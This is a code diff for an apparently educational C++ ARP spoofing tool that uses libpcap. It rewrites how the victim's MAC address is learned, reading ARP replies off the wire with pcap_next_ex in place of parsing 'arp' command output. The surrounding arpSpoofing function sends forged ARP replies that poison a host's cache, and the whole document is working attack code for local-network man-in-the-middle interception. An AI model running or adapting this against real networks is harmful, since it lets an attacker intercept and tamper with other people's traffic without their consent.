@@ -139,62 +139,40 @@ MyAddr getAttackerAddr(char *dev)
 
 }
 
-Mac getMACAddr(char *IP)
+Mac getMACAddr(pcap_t* handle, Ip IP)
 {
-
-    printf("%s\n",IP);
-    FILE *fp = NULL;
-    Mac myMac;
-    int len = strlen(IP);
-
-    if((fp=popen("arp","r"))==NULL)
+    while(1)
     {
-        fprintf(stderr,"Failed to open cmd");
-        pclose(fp);
-        exit(1);
-    }
+        struct pcap_pkthdr* hdr;
+        const u_char* packet;
 
-    char line[MAX_STR_SIZE] = "\0";
+        int res = pcap_next_ex(handle, &hdr, &packet);
 
-    const char *regexIP = "(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9])[.]){3}(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9]))";
-    const char *regexMAC = "([0-9a-fA-F]{2}[:]){5}[0-9a-fA-F][0-9a-fA-F]";
-
-    regex_t regexComIP, regexComMac;
-    regmatch_t matchIP[MAX_STR_SIZE],matchMAC[MAX_STR_SIZE];
-    char cmpIP[MAX_STR_SIZE], mMAC[MAX_STR_SIZE];
-
-    if(regcomp(&regexComIP,regexIP,REG_EXTENDED) || regcomp(&regexComMac,regexMAC,REG_EXTENDED))
-    {
-        fprintf(stderr,"Could not compile regular Expresion.\n");
-        exit(1);
-    }
-
-    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
-    {
-        //printf("line : %s",line);
-        if(regexec(&regexComIP,line,MAX_STR_SIZE,matchIP,REG_EXTENDED)==0)
+        if(res==0)
         {
-            len = matchIP[0].rm_eo-matchIP[0].rm_so;
-            strncpy(cmpIP, line+matchIP[0].rm_so, len);
-            cmpIP[len]='\0';
-            //printf("cmpIP : %s\n",cmpIP);
+            continue;
+        }
 
-            if(strcmp(cmpIP, IP)==0 && regexec(&regexComMac,line,MAX_STR_SIZE,matchMAC,REG_EXTENDED)==0)
-            {
-                len=matchMAC[0].rm_eo-matchMAC[0].rm_so;
-                strncpy(mMAC,line+matchMAC[0].rm_so,len);
-                mMAC[len]='\0';
-                //printf("mMAC : %s\n",mMAC);
-                regfree(&regexComMac);
-                regfree(&regexComIP);
-                return Mac(mMAC);
-            }
+        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            fprintf(stderr,"pcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
+            exit(1);
+        }
+
+        struct EthArpPacket* etharp = (EthArpPacket *)packet;
+
+        if(etharp->eth_.type() == EthHdr::Arp  && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== IP)
+        {
+            return etharp->arp_.smac();
+        }
+        else
+        {
+            printf("wrong packet\n");
+            printf("%d\n",ntohs(etharp->eth_.type_));
+            printf("%d\n",ntohs(etharp->arp_.op_));
+            printf("Ip(myip) : %s\n\n",std::string(etharp->arp_.sip()).c_str());
         }
     }
-    regfree(&regexComMac);
-    regfree(&regexComIP);
-    fprintf(stderr,"We couldn't find Mac address\n");
-    exit(1);
 }
 
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
@@ -205,7 +183,7 @@ void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
     Ip sIP = Ip(sendIP);
     Ip tIP = Ip(targetIP);
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
-    Mac sMAC = getMACAddr(sendIP);
+    Mac sMAC = getMACAddr(handle, sIP);
     printf("smac : %s\n",std::string(sMAC).c_str());
     sendARPReply(handle, sMAC, attacker.mac_,attacker.mac_,tIP,sMAC,sIP);
 
@@ -230,6 +208,7 @@ void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip
     packet.arp_.tip_ = htonl(arp_tip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthArpPacket));
+
     if(res!=0)
     {
         fprintf(stderr,"pcap_sendpacket return %d error = %s\n",res,pcap_geterr(handle));
